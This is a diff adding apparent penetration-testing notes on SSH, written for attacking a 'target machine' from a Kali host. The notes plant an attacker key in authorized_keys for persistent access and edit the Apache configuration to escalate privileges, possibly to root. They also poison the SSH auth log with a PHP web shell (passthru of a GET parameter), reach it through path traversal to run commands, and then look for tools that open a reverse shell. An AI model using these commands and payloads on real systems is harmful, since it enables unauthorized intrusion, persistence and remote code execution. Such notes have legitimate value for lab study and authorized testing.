@@ -1,0 +1,45 @@
+SSH
+Connecting to a system using ssh and ssh key:
+ssh -i ssh_key -p 22 admin@someserver.com
+How to make SSH keys
+(On your kali machine:)
+ssh-keygen
+cat id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB ---SNIP--- +EC1Hg/Cm/V6CRrHM= kali@kali
+
+(On the target machine,)
+mkdir /home/dev/.ssh
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB ---SNIP--- +EC1Hg/Cm/V6CRrHM= kali@kali" > /home/dev/.ssh/authorized_keys
+
+(copy the target machine generated private key locally on your machine and now ssh into the machine with it)
+ssh -i id_rsa dev@192.168.x.150
+If you have start, stop, restart capability for SSH (in sudo -l for ex), then configure the /etc/apache2/apache2.conf file so when you ssh in again, you log in as different use (lateral or priv esc) 
+** this example is when the tester used reverse shell to ssh into the VM
+
+cd /var/tmp
+cp /etc/apache2/apache2.conf .
+sed -i 's/User ${APACHE_RUN_USER}/User userName/g' apache2.conf
+sed -i 's/Group ${APACHE_RUN_GROUP}/Group userGroup/g' apache2.conf
+    ** maybe userName and userGroup could be root // root
+cp apache2.conf /etc/apache2/apache2.conf
+
+** DO NOT STOP apache, but restart it instead **
+
+/bin/systemctl restart apache2
+
+** use reverse shell again to ssh
+
+
+
+
+SSH Poisoning
+
+nc -nv x.x.x.x 22
+isthissshpoisonworking/<?php passthru($_GET['cmd']); ?>
+    ** after refreshing ../../../../../../../../../../var/log/auth.log, if you see isthissshpoisonworking/ then it's code executable
+​
+../../../../../../../../../../var/log/auth.log?cmd=id
+../../../../../../../../../../var/log/auth.log&cmd=id
+    **something like this should execute the command "id"
+    
+** after this, check for nc, python, or python3 for reverse shell
